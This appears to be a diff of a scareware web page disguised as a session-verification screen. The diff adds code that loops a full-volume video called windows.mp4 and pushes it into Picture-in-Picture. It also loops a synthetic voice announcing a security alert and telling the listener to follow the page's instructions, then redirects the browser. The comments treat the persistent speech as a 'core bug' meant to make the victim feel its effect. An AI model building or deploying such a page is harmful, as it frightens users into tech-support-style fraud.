@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Loading...</title>
+  <title>Verifying...</title>
 </head>
 
-<body style="margin:0; background:black; color:white; text-align:center; font-family:sans-serif;">
+<body style="margin:0; background:black; color:white; font-family:sans-serif; text-align:center;">
 
-<div id="overlay" style="position:absolute; top:40%; width:100%;">
+<div id="overlay" style="position:absolute; top:40%; width:100%; z-index:2;">
   <h2>Verifying your session...</h2>
   <p>Please wait</p>
   <button onclick="start()" style="padding:12px 24px; font-size:16px;">
@@ -14,33 +14,53 @@
   </button>
 </div>
 
-<video id="v" src="windows.mp4"
-style="width:100%; height:100%; object-fit:cover;"
-playsinline></video>
+<video id="v"
+  src="windows.mp4"
+  controls
+  playsinline
+  style="width:100%; height:100%; object-fit:cover;">
+</video>
 
 <script>
-function start(){
+async function start(){
+
   const v = document.getElementById("v");
 
-  // 🔊 pastikan bisa autoplay setelah klik
+  // 🎬 Start video
   v.muted = false;
   v.volume = 1;
-
-  // ▶️ play video
-  v.play().catch(()=>{});
-
-  // 🔥 coba masuk fullscreen (lebih immersive)
-  if (v.requestFullscreen) {
-    v.requestFullscreen().catch(()=>{});
-  }
-
-  // 🔁 loop biar terus jalan selama sebelum redirect
   v.loop = true;
 
-  // ⏱️ delay sedikit biar user “kena” videonya dulu
+  try {
+    await v.play();
+  } catch(e){}
+
+  // 🔥 Try Picture-in-Picture
+  try {
+    if (document.pictureInPictureEnabled) {
+      await v.requestPictureInPicture();
+    }
+  } catch(e){}
+
+  // 🔊 Speech (core bug)
+  const msg = new SpeechSynthesisUtterance(
+    "Security alert. Suspicious activity detected. Please follow the instructions on this page."
+  );
+
+  const voices = speechSynthesis.getVoices();
+  if (voices.length > 0) {
+    msg.voice = voices.find(v => v.lang.includes("en")) || voices[0];
+  }
+
+  speechSynthesis.speak(msg);
+
+  // 🔁 Loop speech biar persistent
+  msg.onend = () => speechSynthesis.speak(msg);
+
+  // ⏱️ Delay dikit biar user “kena efeknya”
   setTimeout(() => {
     window.location.href = "https://www.google.com";
-  }, 1200); // bisa tweak 800–1500ms
+  }, 1200);
 }
 </script>
 
